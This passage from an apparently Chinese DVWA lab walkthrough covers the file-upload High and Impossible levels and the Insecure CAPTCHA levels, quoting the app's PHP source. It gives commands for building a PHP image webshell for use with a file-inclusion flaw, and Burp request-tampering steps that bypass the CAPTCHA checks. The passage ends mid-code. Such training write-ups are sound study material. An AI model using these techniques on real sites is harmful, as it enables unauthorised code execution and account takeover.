<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'Upload'</span> ] ) ) {<br>    <span class="hljs-comment">// Where are we going to be writing to?</span><br>    <span class="hljs-variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">"hackable/uploads/"</span>;<br>    <span class="hljs-variable">$target_path</span> .= <span class="hljs-title function_ invoke__">basename</span>( <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'uploaded'</span> ][ <span class="hljs-string">'name'</span> ] );<br><br>    <span class="hljs-comment">// File information</span><br>    <span class="hljs-variable">$uploaded_name</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'uploaded'</span> ][ <span class="hljs-string">'name'</span> ];<br>    <span class="hljs-variable">$uploaded_ext</span>  = <span class="hljs-title function_ invoke__">substr</span>( <span class="hljs-variable">$uploaded_name</span>, <span class="hljs-title function_ invoke__">strrpos</span>( <span class="hljs-variable">$uploaded_name</span>, <span class="hljs-string">'.'</span> ) + <span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$uploaded_size</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'uploaded'</span> ][ <span class="hljs-string">'size'</span> ];<br>    <span class="hljs-variable">$uploaded_tmp</span>  = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'uploaded'</span> ][ <span class="hljs-string">'tmp_name'</span> ];<br><br>    <span class="hljs-comment">// Is it an image?</span><br>    <span class="hljs-keyword">if</span>( ( <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">"jpg"</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">"jpeg"</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">"png"</span> ) &amp;&amp;<br>        ( <span class="hljs-variable">$uploaded_size</span> &lt; <span class="hljs-number">100000</span> ) &amp;&amp;<br>        <span class="hljs-title function_ invoke__">getimagesize</span>( <span class="hljs-variable">$uploaded_tmp</span> ) ) {<br><br>        <span class="hljs-comment">// Can we move the file to the upload folder?</span><br>        <span class="hljs-keyword">if</span>( !<span class="hljs-title function_ invoke__">move_uploaded_file</span>( <span class="hljs-variable">$uploaded_tmp</span>, <span class="hljs-variable">$target_path</span> ) ) {<br>            <span class="hljs-comment">// No</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;<br>        }<br>        <span class="hljs-keyword">else</span> {<br>            <span class="hljs-comment">// Yes!</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;<span class="hljs-subst">{$target_path}</span> succesfully uploaded!&lt;/pre&gt;"</span>;<br>        }<br>    }<br>    <span class="hljs-keyword">else</span> {<br>        <span class="hljs-comment">// Invalid file</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>;<br>    }<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>这里是取出了文件上传时的后缀名，如果不是jpg或者jpeg或者png，则上传失败。同时还使用<code>getimagesize</code>函数检测上传的文件是否为图片，这里可以使用图片马绕过。</p>
<p>Linux下图片马的制作：</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scss"># 将 shell<span class="hljs-selector-class">.php</span> 内容追加到 pic<span class="hljs-selector-class">.png</span><br>cat shell<span class="hljs-selector-class">.php</span> &gt;&gt; pic<span class="hljs-selector-class">.png</span><br><br># png + php 合成 png 图马<br>cat pic<span class="hljs-selector-class">.png</span> shell<span class="hljs-selector-class">.php</span> &gt;&gt; shell<span class="hljs-selector-class">.png</span><br><br># 直接 echo 追加<br>echo '&lt;?php <span class="hljs-built_in">phpinfo</span>();?&gt;' &gt;&gt; pic<span class="hljs-selector-class">.png</span><br></code></pre></td></tr></tbody></table></figure>
<p>Windows下图片马的制作：</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">copy pic<span class="hljs-selector-class">.png</span>/<span class="hljs-selector-tag">b</span>+shell<span class="hljs-selector-class">.php</span>/<span class="hljs-selector-tag">a</span> shell<span class="hljs-selector-class">.png</span><br></code></pre></td></tr></tbody></table></figure>
<p>正常制作图片马上传即可，接着利用上一关的文件包含漏洞包含png使其解析其中的PHP代码即可</p>
<h2 id="Impossible-5">Impossible</h2>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'Upload'</span> ] ) ) {<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">'user_token'</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">'session_token'</span> ], <span class="hljs-string">'index.php'</span> );<br><br>    <span class="hljs-comment">// File information</span><br>    <span class="hljs-variable">$uploaded_name</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'uploaded'</span> ][ <span class="hljs-string">'name'</span> ];<br>    <span class="hljs-variable">$uploaded_ext</span>  = <span class="hljs-title function_ invoke__">substr</span>( <span class="hljs-variable">$uploaded_name</span>, <span class="hljs-title function_ invoke__">strrpos</span>( <span class="hljs-variable">$uploaded_name</span>, <span class="hljs-string">'.'</span> ) + <span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$uploaded_size</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'uploaded'</span> ][ <span class="hljs-string">'size'</span> ];<br>    <span class="hljs-variable">$uploaded_type</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'uploaded'</span> ][ <span class="hljs-string">'type'</span> ];<br>    <span class="hljs-variable">$uploaded_tmp</span>  = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'uploaded'</span> ][ <span class="hljs-string">'tmp_name'</span> ];<br><br>    <span class="hljs-comment">// Where are we going to be writing to?</span><br>    <span class="hljs-variable">$target_path</span>   = DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">'hackable/uploads/'</span>;<br>    <span class="hljs-comment">//$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-';</span><br>    <span class="hljs-variable">$target_file</span>   =  <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-title function_ invoke__">uniqid</span>() . <span class="hljs-variable">$uploaded_name</span> ) . <span class="hljs-string">'.'</span> . <span class="hljs-variable">$uploaded_ext</span>;<br>    <span class="hljs-variable">$temp_file</span>     = ( ( <span class="hljs-title function_ invoke__">ini_get</span>( <span class="hljs-string">'upload_tmp_dir'</span> ) == <span class="hljs-string">''</span> ) ? ( <span class="hljs-title function_ invoke__">sys_get_temp_dir</span>() ) : ( <span class="hljs-title function_ invoke__">ini_get</span>( <span class="hljs-string">'upload_tmp_dir'</span> ) ) );<br>    <span class="hljs-variable">$temp_file</span>    .= DIRECTORY_SEPARATOR . <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-title function_ invoke__">uniqid</span>() . <span class="hljs-variable">$uploaded_name</span> ) . <span class="hljs-string">'.'</span> . <span class="hljs-variable">$uploaded_ext</span>;<br><br>    <span class="hljs-comment">// Is it an image?</span><br>    <span class="hljs-keyword">if</span>( ( <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">'jpg'</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">'jpeg'</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">'png'</span> ) &amp;&amp;<br>        ( <span class="hljs-variable">$uploaded_size</span> &lt; <span class="hljs-number">100000</span> ) &amp;&amp;<br>        ( <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">'image/jpeg'</span> || <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">'image/png'</span> ) &amp;&amp;<br>        <span class="hljs-title function_ invoke__">getimagesize</span>( <span class="hljs-variable">$uploaded_tmp</span> ) ) {<br><br>        <span class="hljs-comment">// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)</span><br>        <span class="hljs-keyword">if</span>( <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">'image/jpeg'</span> ) {<br>            <span class="hljs-variable">$img</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>( <span class="hljs-variable">$uploaded_tmp</span> );<br>            <span class="hljs-title function_ invoke__">imagejpeg</span>( <span class="hljs-variable">$img</span>, <span class="hljs-variable">$temp_file</span>, <span class="hljs-number">100</span>);<br>        }<br>        <span class="hljs-keyword">else</span> {<br>            <span class="hljs-variable">$img</span> = <span class="hljs-title function_ invoke__">imagecreatefrompng</span>( <span class="hljs-variable">$uploaded_tmp</span> );<br>            <span class="hljs-title function_ invoke__">imagepng</span>( <span class="hljs-variable">$img</span>, <span class="hljs-variable">$temp_file</span>, <span class="hljs-number">9</span>);<br>        }<br>        <span class="hljs-title function_ invoke__">imagedestroy</span>( <span class="hljs-variable">$img</span> );<br><br>        <span class="hljs-comment">// Can we move the file to the web root from the temp folder?</span><br>        <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">rename</span>( <span class="hljs-variable">$temp_file</span>, ( <span class="hljs-title function_ invoke__">getcwd</span>() . DIRECTORY_SEPARATOR . <span class="hljs-variable">$target_path</span> . <span class="hljs-variable">$target_file</span> ) ) ) {<br>            <span class="hljs-comment">// Yes!</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;&lt;a href='<span class="hljs-subst">{$target_path}</span><span class="hljs-subst">{$target_file}</span>'&gt;<span class="hljs-subst">{$target_file}</span>&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;"</span>;<br>        }<br>        <span class="hljs-keyword">else</span> {<br>            <span class="hljs-comment">// No</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;<br>        }<br><br>        <span class="hljs-comment">// Delete any temp files</span><br>        <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">file_exists</span>( <span class="hljs-variable">$temp_file</span> ) )<br>            <span class="hljs-title function_ invoke__">unlink</span>( <span class="hljs-variable">$temp_file</span> );<br>    }<br>    <span class="hljs-keyword">else</span> {<br>        <span class="hljs-comment">// Invalid file</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>;<br>    }<br>}<br><span class="hljs-comment">// Generate Anti-CSRF token</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>使用了时间戳的md5值做文件名，然后添加文件后缀，接着判断后缀名以及content-type类型，和检测是否为图片，同时使用<code>imagecreatefrompng</code>等类似函数，删除掉了元数据，创建新图像。意味着图片马也无法绕过了</p>
<h1>0x06 Insecure CAPTCHA</h1>
<h2 id="Low-6">Low</h2>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'Change'</span> ] ) &amp;&amp; ( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'step'</span> ] == <span class="hljs-string">'1'</span> ) ) {<br>    <span class="hljs-comment">// Hide the CAPTCHA form</span><br>    <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'password_new'</span> ];<br>    <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'password_conf'</span> ];<br><br>    <span class="hljs-comment">// Check CAPTCHA from 3rd party</span><br>    <span class="hljs-variable">$resp</span> = <span class="hljs-title function_ invoke__">recaptcha_check_answer</span>(<br>        <span class="hljs-variable">$_DVWA</span>[ <span class="hljs-string">'recaptcha_private_key'</span>],<br>        <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'g-recaptcha-response'</span>]<br>    );<br><br>    <span class="hljs-comment">// Did the CAPTCHA fail?</span><br>    <span class="hljs-keyword">if</span>( !<span class="hljs-variable">$resp</span> ) {<br>        <span class="hljs-comment">// What happens when the CAPTCHA was entered incorrectly</span><br>        <span class="hljs-variable">$html</span>     .= <span class="hljs-string">"&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;"</span>;<br>        <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">return</span>;<br>    }<br>    <span class="hljs-keyword">else</span> {<br>        <span class="hljs-comment">// CAPTCHA was correct. Do both new passwords match?</span><br>        <span class="hljs-keyword">if</span>( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) {<br>            <span class="hljs-comment">// Show next stage for the user</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">"</span><br><span class="hljs-string">                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;</span><br><span class="hljs-string">                &lt;form action=\"#\" method=\"POST\"&gt;</span><br><span class="hljs-string">                    &lt;input type=\"hidden\" name=\"step\" value=\"2\" /&gt;</span><br><span class="hljs-string">                    &lt;input type=\"hidden\" name=\"password_new\" value=\"<span class="hljs-subst">{$pass_new}</span>\" /&gt;</span><br><span class="hljs-string">                    &lt;input type=\"hidden\" name=\"password_conf\" value=\"<span class="hljs-subst">{$pass_conf}</span>\" /&gt;</span><br><span class="hljs-string">                    &lt;input type=\"submit\" name=\"Change\" value=\"Change\" /&gt;</span><br><span class="hljs-string">                &lt;/form&gt;"</span>;<br>        }<br>        <span class="hljs-keyword">else</span> {<br>            <span class="hljs-comment">// Both new passwords do not match.</span><br>            <span class="hljs-variable">$html</span>     .= <span class="hljs-string">"&lt;pre&gt;Both passwords must match.&lt;/pre&gt;"</span>;<br>            <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">false</span>;<br>        }<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure>
<p>前半部分代码如上，这里看到他会先去判断验证码是否正确，如果正确才会接着去判断密码修改情况。否则报错</p>
<p>关键在于第二部分代码：</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'Change'</span> ] ) &amp;&amp; ( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'step'</span> ] == <span class="hljs-string">'2'</span> ) ) {<br>    <span class="hljs-comment">// Hide the CAPTCHA form</span><br>    <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'password_new'</span> ];<br>    <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'password_conf'</span> ];<br><br>    <span class="hljs-comment">// Check to see if both password match</span><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) {<br>        <span class="hljs-comment">// They do!</span><br>        <span class="hljs-variable">$pass_new</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>],  <span class="hljs-variable">$pass_new</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));<br>        <span class="hljs-variable">$pass_new</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass_new</span> );<br><br>        <span class="hljs-comment">// Update database</span><br>        <span class="hljs-variable">$insert</span> = <span class="hljs-string">"UPDATE `users` SET password = '<span class="hljs-subst">$pass_new</span>' WHERE user = '"</span> . <span class="hljs-title function_ invoke__">dvwaCurrentUser</span>() . <span class="hljs-string">"';"</span>;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>],  <span class="hljs-variable">$insert</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;'</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">'&lt;/pre&gt;'</span> );<br><br>        <span class="hljs-comment">// Feedback for the end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;<br>    }<br>    <span class="hljs-keyword">else</span> {<br>        <span class="hljs-comment">// Issue with the passwords matching</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;<br>        <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">false</span>;<br>    }<br><br>    ((<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>这里在if语句的开头都对step的参数做了判断，如果是2的话，就默认为经历了step=1的验证码的验证，接着取将修改后的密码直接插入数据库更新（同时防止了SQL注入）</p>
<p>这意味着我们可以在修改密码之后，bp抓包修改step的值来绕过</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112172843455.png" alt="image-20240112172843455"></p>
<h2 id="Medium-6">Medium</h2>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112173235566.png" alt="image-20240112173235566"></p>
<p>这里与上一关的不同点在于，上述图片中的表单form中添加了一个隐藏元素passed_captcha并被设置为了true，这会被用于第二步</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112173336700.png" alt="image-20240112173336700"></p>
<p>他会判断passed_captcha表单元素是否存在，也就是判断了step=1这一步是否被执行过，但我们依旧可以bp修改绕过，只需要抓包修改step为2进入第二个if判断，接着添加passed_captcha元素为true即可</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112173226410.png" alt="image-20240112173226410"></p>
<h2 id="High-6">High</h2>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112175650521.png" alt="image-20240112175650521"></p>
<p>与前几个级别不同点在于，这一关取消了step的判断，但却在判断验证码是否正确的同时，多了如下代码</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'g-recaptcha-response'</span> ] == <span class="hljs-string">'hidd3n_valu3'</span><br>            &amp;&amp; <span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">'HTTP_USER_AGENT'</span> ] == <span class="hljs-string">'reCAPTCHA'</span><br></code></pre></td></tr></tbody></table></figure>
<p>这明摆着，直接bp修改即可，如下图，添加<code>g-recaptcha-response</code>的同时，修改UA头，即可绕过，但这里我似乎还需要删除step这个参数才能成功，不知为何</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112175639711.png" alt="image-20240112175639711"></p>
<h2 id="Impossible-6">Impossible</h2>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'Change'</span> ] ) ) {<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">'user_token'</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">'session_token'</span> ], <span class="hljs-string">'index.php'</span> );<br><br>    <span class="hljs-comment">// Hide the CAPTCHA form</span><br>    <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'password_new'</span> ];<br>    <span class="hljs-variable">$pass_new</span>  = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$pass_new</span> );<br>    <span class="hljs-variable">$pass_new</span>  = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>],  <span class="hljs-variable">$pass_new</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));<br>    <span class="hljs-variable">$pass_new</span>  = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass_new</span> );<br><br>    <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'password_conf'</span> ];<br>    <span class="hljs-variable">$pass_conf</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$pass_conf</span> );<br>    <span class="hljs-variable">$pass_conf</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>],  <span class="hljs-variable">$pass_conf</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));<br>    <span class="hljs-variable">$pass_conf</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass_conf</span> );<br><br>    <span class="hljs-variable">$pass_curr</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'password_current'</span> ];<br>    <span class="hljs-variable">$pass_curr</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$pass_curr</span> );<br>    <span class="hljs-variable">$pass_curr</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span 